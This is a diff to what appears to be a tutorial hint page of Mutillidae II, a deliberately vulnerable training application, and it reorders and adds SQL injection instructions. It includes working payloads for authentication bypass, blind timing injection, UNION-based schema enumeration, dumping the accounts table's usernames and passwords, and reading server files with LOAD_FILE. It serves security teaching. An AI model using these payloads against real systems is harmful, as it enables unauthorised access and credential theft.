@@ -17,206 +17,8 @@
 			statements including statements which cause errors, induce pauses,
 			and cause differences when similar statements evaluate to true or false. 
 			<br/><br/>
-			Hint: Use Burp-Suite and SQLMap to fuzz sites quickly
+			You may use tools like Burp-Suite and SQLMap to fuzz sites quickly
 			<br/><br/>
-			<span class="report-header">Exploitation</span>
-			<br/><br/>
-			<ol class="tutorial">
-				<li>
-					Determine if SQL injection exists
-					<br/><br/>
-					<ul>
-						<li>
-							Try injecting characters reserved in databases to produce error messages
-							<br/><br/>
-							<span class="important-code">single-quote<br/>back-slash<br/>double-hyphen<br/>forward-slash<br/>period</span>
-							<br/><br/> 
-						</li>
-						<li>If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.</li>
-						<li>
-							If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses
-							<br/><br/>
-							<span class="important-code">
-								Technique: Blind SQL Injection - True and False Values<br/>
-								Field: username<br/>
-								True Value (Using Proxy): &#39; or 1=1 --<br/> 
-								False Value (Using Proxy): &#39; and 1=0 --<br/>
-							</span>
-							<br/> 
-						</li>
-						<li>
-							If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")
-							<br/><br/>
-							<span class="important-code">
-								&#39; union Select null, null, null, sleep(5) -- 
-							</span>
-							<br/><br/>
-						</li>
-					</ul>
-				</li>
-				<li>
-					Determine injection types that work<br/><br/>
-					
-					<ul>
-						<li>Determine the prefix and suffix needed to make the injected code "fit" syntatically
-							then add a payload between. Inject the exploit.
-							<br/><br/>
-							Example: Some pages on the site are vulnerable to
-							<br/>
-<code>
-' or 1=1 -- (Note: There is a space on the end of this expression) 
-</code>
-			<br/>
-			Note that some characters which are reserved in databases are also reserved
-			in web servers. If submitting injections directly via an interception proxy 
-			like Burp-Suite, URL encode the injection to avoid a syntax error on the
-			web server. 
-			<br/><br/>
-			URL Encoded version
-			<br/>
-<code>
-%27%20%6f%72%20%31%3d%31%20%2d%2d%20 
-</code>
-<br/>
-					
-						</li>
-						<li>
-							UNION statements
-							<br/><br/>
-							<ul>
-								<li>Determine number of columns in application query. Inject NULL columns until injected query works.</li>
-								<li>Determine position of a varchar or equivalent column</li>
-								<li>Use position of found column(s) to place injected columns. Use NULL for rest</li>
-								<br/>
-							</ul>
-						</li>
-						<li>Inline injection
-							<br/><br/>
-							<ul>
-								<li>Usually happens when ORDER BY or HAVING clause present in application query</li>
-								<br/>
-							</ul>
-						</li>
-						<li>Timing injection
-							<br/><br/>
-							<span class="important-code">
-								Technique: Blind SQL Injection - Timing<br/>
-								Page: login.php<br/>
-								Field: username<br/>
-								Value (Using Proxy): &#39; union Select null, case SUBSTRING(current_user(),1,1) when &#39;r&#39; THEN sleep(5) ELSE sleep(0) END, null, null --<br/> 
-								Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&amp;password=&amp;login-php-submit-button=1
-							</span>
-							<br/><br/>
-						</li>
-					</ul>
-				</li>
-				<li>
-					Attempt to determine database server brand
-					<br/><br/>
-					<span class="important-code">
-						Technique: Direct Injection<br/>
-						Page: user-info.php<br/>
-						Field: username<br/>
-						Value (Using Proxy): &#39; union select null,VERSION() AS username,null,null -- <br/> 
-					</span>
-					<br/>
-				</li>
-				<li>Formulate and test query</li>
-				<br/>
-				<li>Attempt to determine database name
-					<br/><br/>
-					<span class="important-code">
-						Technique: Direct Injection<br/>
-						Page: user-info.php<br/>
-						Field: username<br/>
-						Value (Using Proxy): &#39; union select null,DATABASE() AS username,null,null -- <br/> 
-					</span>
-					<br/>
-				</li>
-				<li>Attempt to determine schema name
-					<br/><br/>
-					<span class="important-code">
-						Technique: Direct Injection<br/>
-						Page: user-info.php<br/>
-						Field: username<br/>
-						Value (Using Proxy): &#39; union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES-- <br/> 
-					</span>
-					<br/>
-				</li>
-				<li>
-					Attempt to determine table(s) names
-					<br/><br/>
-					<span class="important-code">
-						Technique: Direct Injection<br/>
-						Page: user-info.php<br/>
-						Field: username<br/>
-						Value (Using Proxy): &#39; union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- <br/> 
-					</span>
-					<br/>
-				</li>
-				<li>Attempt to determine column(s) names
-					<br/><br/>
-					<span class="important-code">
-						Technique: Direct Injection<br/>
-						Recon: Extract table columns from database using a single field<br/>
-						Page: user-info.php<br/>
-						Field: Username<br/>
-						Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--<br/> 
-					</span>
-					<br/>
-				</li>
-				<li>
-					Attempt to extract data
-					<br/><br/>
-					<span class="important-code">
-						Technique: Direct Injection<br/>
-						Page: user-info.php<br/>
-						Field: Username<br/>
-						Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- <br/>
-					</span>
-					<br/>
-				</li>
-				<li>
-					Attempt to read files from server
-					<br/><br/>
-					<span class="important-code">
-						Technique: Direct Injection<br/>
-						Page: user-info.php<br/>
-						Field: username<br/>
-						Value (relative path):<br/>
-						' union select null, LOAD_FILE('../README') AS username, null, null--<br/><br/> 
-						Value (absolute path):<br/>
-						' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--<br/> 
-						' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--<br/> 
-					</span>
-					<br/>
-				</li>
-				<li>Attempt to upload files to server</li>
-				<br/>			
-				<li>
-					Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited
-					system command abilities. SQL Server 2008 disables system commands by default and requires
-					them to be enabled.
-				</li>
-				<br/>
-				<li>
-					Attempt to determine database computer name, IP address, username, version, etc.
-					<br/><br/>
-					<span class="important-code">
-						MySQL Functions:<br/>
-						VERSION() - MySQL server version<br/>
-						USER() - Database user issuing query<br/>
-						DATABASE() - Database on server against which query is running
-						<br/><br/>
-					</span>
-				</li>
-				<li>
-					Attempt to pivot to database server level. This will largely depend on either being able to execute
-					system commands via the database server or upload files to the file system. Uploading files would allow
-					web application pages to be uploaded which can contain system calls.
-				</li>
-			</ol>
-			<br/>
 			<span class="report-header">Reconnaissance</span>
 			<br/><br/>
 			Error messages can be excellent sources of information. 
@@ -333,6 +135,203 @@
 ' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
 </code>
 		<br/>
+			<span class="report-header">Exploitation</span>
+			<br/>
+			<ol class="tutorial">
+				<li>
+					Determine if SQL injection exists
+					<br/><br/>
+					<ul>
+						<li>
+							Try injecting characters reserved in databases to produce error messages
+							<br/><br/>
+							<span class="important-code">single-quote<br/>back-slash<br/>double-hyphen<br/>forward-slash<br/>period</span>
+							<br/><br/> 
+						</li>
+						<li>If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.</li>
+						<li>
+							If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses
+							<br/><br/>
+							<span class="important-code">
+								Technique: Blind SQL Injection - True and False Values<br/>
+								Field: username<br/>
+								True Value (Using Proxy): &#39; or 1=1 --<br/> 
+								False Value (Using Proxy): &#39; and 1=0 --<br/>
+							</span>
+							<br/> 
+						</li>
+						<li>
+							If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")
+							<br/><br/>
+							<span class="important-code">
+								&#39; union Select null, null, null, sleep(5) -- 
+							</span>
+							<br/><br/>
+						</li>
+					</ul>
+				</li>
+				<li>
+					Determine injection types that work<br/><br/>
+					
+					<ul>
+						<li>Determine the prefix and suffix needed to make the injected code "fit" syntatically
+							then add a payload between. Inject the exploit.
+							<br/><br/>
+							Example: Some pages on the site are vulnerable to
+							<br/>
+<code>
+' or 1=1 -- (Note: There is a space on the end of this expression) 
+</code>
+			<br/>
+			Note that some characters which are reserved in databases are also reserved
+			in web servers. If submitting injections directly via an interception proxy 
+			like Burp-Suite, URL encode the injection to avoid a syntax error on the
+			web server. 
+			<br/><br/>
+			URL Encoded version
+			<br/>
+<code>
+%27%20%6f%72%20%31%3d%31%20%2d%2d%20 
+</code>
+<br/>
+					
+					</li>
+					<li>
+						UNION statements
+						<br/><br/>
+						<ul>
+							<li>Determine number of columns in application query. Inject NULL columns until injected query works.</li>
+							<li>Determine position of a varchar or equivalent column</li>
+							<li>Use position of found column(s) to place injected columns. Use NULL for rest</li>
+							<br/>
+						</ul>
+					</li>
+					<li>Inline injection
+						<br/><br/>
+						<ul>
+							<li>Usually happens when ORDER BY or HAVING clause present in application query</li>
+							<br/>
+						</ul>
+					</li>
+					<li>Timing injection
+						<br/><br/>
+						<span class="important-code">
+							Technique: Blind SQL Injection - Timing<br/>
+							Page: login.php<br/>
+							Field: username<br/>
+							Value (Using Proxy): &#39; union Select null, case SUBSTRING(current_user(),1,1) when &#39;r&#39; THEN sleep(5) ELSE sleep(0) END, null, null --<br/> 
+							Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&amp;password=&amp;login-php-submit-button=1
+						</span>
+						<br/><br/>
+					</li>
+				</ul>
+			</li>
+			<li>
+				Attempt to determine database server brand
+				<br/><br/>
+				<span class="important-code">
+					Technique: Direct Injection<br/>
+					Page: user-info.php<br/>
+					Field: username<br/>
+					Value (Using Proxy): &#39; union select null,VERSION() AS username,null,null -- <br/> 
+				</span>
+				<br/>
+			</li>
+			<li>Formulate and test query</li>
+			<br/>
+			<li>Attempt to determine database name
+				<br/><br/>
+				<span class="important-code">
+					Technique: Direct Injection<br/>
+					Page: user-info.php<br/>
+					Field: username<br/>
+					Value (Using Proxy): &#39; union select null,DATABASE() AS username,null,null -- <br/> 
+				</span>
+				<br/>
+			</li>
+			<li>Attempt to determine schema name
+				<br/><br/>
+				<span class="important-code">
+					Technique: Direct Injection<br/>
+					Page: user-info.php<br/>
+					Field: username<br/>
+					Value (Using Proxy): &#39; union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES-- <br/> 
+				</span>
+				<br/>
+			</li>
+			<li>
+				Attempt to determine table(s) names
+				<br/><br/>
+				<span class="important-code">
+					Technique: Direct Injection<br/>
+					Page: user-info.php<br/>
+					Field: username<br/>
+					Value (Using Proxy): &#39; union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- <br/> 
+				</span>
+				<br/>
+			</li>
+			<li>Attempt to determine column(s) names
+				<br/><br/>
+				<span class="important-code">
+					Technique: Direct Injection<br/>
+					Recon: Extract table columns from database using a single field<br/>
+					Page: user-info.php<br/>
+					Field: Username<br/>
+					Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--<br/> 
+				</span>
+				<br/>
+			</li>
+			<li>
+				Attempt to extract data
+				<br/><br/>
+				<span class="important-code">
+					Technique: Direct Injection<br/>
+					Page: user-info.php<br/>
+					Field: Username<br/>
+					Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- <br/>
+				</span>
+				<br/>
+			</li>
+			<li>
+				Attempt to read files from server
+				<br/><br/>
+				<span class="important-code">
+					Technique: Direct Injection<br/>
+					Page: user-info.php<br/>
+					Field: username<br/>
+					Value (relative path):<br/>
+					' union select null, LOAD_FILE('../README') AS username, null, null--<br/><br/> 
+					Value (absolute path):<br/>
+					' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--<br/> 
+					' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--<br/> 
+				</span>
+				<br/>
+			</li>
+			<li>Attempt to upload files to server</li>
+			<br/>			
+			<li>
+				Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited
+				system command abilities. SQL Server 2008 disables system commands by default and requires
+				them to be enabled.
+			</li>
+			<br/>
+			<li>
+				Attempt to determine database computer name, IP address, username, version, etc.
+				<br/><br/>
+				<span class="important-code">
+					MySQL Functions:<br/>
+					VERSION() - MySQL server version<br/>
+					USER() - Database user issuing query<br/>
+					DATABASE() - Database on server against which query is running
+					<br/><br/>
+				</span>
+			</li>
+			<li>
+				Attempt to pivot to database server level. This will largely depend on either being able to execute
+				system commands via the database server or upload files to the file system. Uploading files would allow
+				web application pages to be uploaded which can contain system calls.
+			</li>
+		</ol>
 		<span class="report-header">Gaining Access</span>
 		<br/><br/>
 		Extract passwords from user table (Example Page: user-info.php)
@@ -401,6 +400,41 @@
 	?&gt;
 </code>
 <br/><br/>
+<span class="report-header">Example (Bypass Authentication)</span>
+<br/><br/>
+<ul>
+	<li>Mutillidae II contains a login page that is vulnerable to SQL injection. Browse to login.php.</li>
+	<li>Verify security level is 0</li>
+	<li>Web applications using forms-based authentication often keep credentials in data stores.
+	The system compares the username and password entered against the credentials on file.</li>
+	<li>Sometimes causing error messages can help. Begin by injecting all characters/patterns that 
+	are reserved in SQL</li>
+	<li>Reserved characters are used to form commands in the database. Try a single-quote (') or an 
+	opening comment symbol (/*) for example</li>
+	<li>If the system sends error messages back to the client, the information may help construct better injections</li>
+	<li>Note that errors may be embedded in HTML comments</li>
+	<li>From the query in the error message, an injection can be formulated directly</li>
+	<li>If the query was not available injection would still be possible but require more time</li>
+	<li>For this particular query the following solution will work: ' or 5=5-- . There is a space at the end.</li>
+</ul>
+<br/>
+<span class="report-header">Example (Dump user credentials)</span>
+<br/><br/>
+<ul>
+	<li>Mutillidae II contains a "user lookup" page that is vulnerable to SQL injection. Browse to user-info.php.</li>
+	<li>Verify security level is 0</li>
+	<li>Page comes in SQL, XML and SOAP versions. Use the SQL version.</li>
+	<li>Sometimes causing error messages can help. Begin by injecting all characters/patterns that 
+	are reserved in SQL</li>
+	<li>Reserved characters are used to form commands in the database. Try a single-quote (') or an 
+	opening comment symbol (/*) for example</li>
+	<li>If the system sends error messages back to the client, the information may help construct better injections</li>
+	<li>Note that errors may be embedded in HTML comments</li>
+	<li>From the query in the error message, an injection can be formulated directly</li>
+	<li>If the query was not available injection would still be possible but require more time</li>
+	<li>For this particular query the following solution will work: ' or 5=5-- . There is a space at the end.</li>
+</ul>
+<br/>
 <span class="report-header">Videos</span>
 <br/><br/>
 <?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->BypassAuthenticationusingSQLInjection);?>
